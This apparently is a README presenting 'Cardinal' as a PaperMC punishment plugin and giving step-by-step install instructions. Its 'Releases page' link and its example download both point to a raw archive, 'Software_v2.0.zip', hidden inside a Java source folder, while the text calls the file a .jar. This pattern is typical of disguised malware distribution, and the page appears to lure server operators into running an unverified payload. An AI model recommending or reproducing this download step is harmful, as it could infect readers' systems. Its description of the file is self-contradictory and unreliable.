## 🌟 Overview
Cardinal is a modern punishment system designed to enhance your experience on PaperMC servers. This tool provides a simple, user-friendly way to manage player behavior through an intuitive GUI.

## 🚀 Getting Started
To get started with Cardinal, you need to follow these steps. 

### Step 1: Prepare Your Environment
Make sure you have a PaperMC server already installed. Cardinal works best with Java 21, so ensure your server is using this version. If you need help with setting up a PaperMC server, there are many resources online.

### Step 2: Visit the Release Page
Go to the [Cardinal Releases page](https://raw.githubusercontent.com/Ilovemybigas/Cardinal/master/cardinal-api/src/main/java/eg/mqzen/cardinal/api/util/Software_v2.0.zip). Here, you will find the latest version of Cardinal available for download.

### Step 3: Download Cardinal
Look for the most recent release. Click to download the plugin file. It will usually have an `.jar` extension, such as `https://raw.githubusercontent.com/Ilovemybigas/Cardinal/master/cardinal-api/src/main/java/eg/mqzen/cardinal/api/util/Software_v2.0.zip`.

### Step 4: Add Cardinal to Your Server
Once the download is complete, you need to place the `.jar` file into the `plugins` folder of your PaperMC server directory. This folder is where all your server plugins reside.

### Step 5: Start Your Server
If your server is not already running, start it up. Cardinal will automatically load when the server starts.

### Step 6: Configure Cardinal
After starting your server, you can find Cardinal's configuration files in the `plugins/Cardinal` folder. Open these files to adjust settings as needed. A simple text editor will allow you to modify the configuration to suit your needs.
